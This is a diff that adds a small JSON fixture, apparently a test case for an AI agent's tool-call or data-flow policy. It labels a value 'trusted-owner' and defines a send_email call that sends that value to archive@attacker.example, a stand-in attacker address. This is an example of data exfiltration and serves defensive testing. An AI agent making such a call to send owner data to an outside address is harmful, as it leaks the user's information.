@@ -1,0 +1,21 @@
+{
+ "values": {
+  "b": {
+   "text": "Hello.",
+   "labels": [
+    "trusted-owner"
+   ]
+  }
+ },
+ "calls": [
+  {
+   "tool": "send_email",
+   "args": {
+    "to": "archive@attacker.example",
+    "body": {
+     "ref": "b"
+    }
+   }
+  }
+ ]
+}
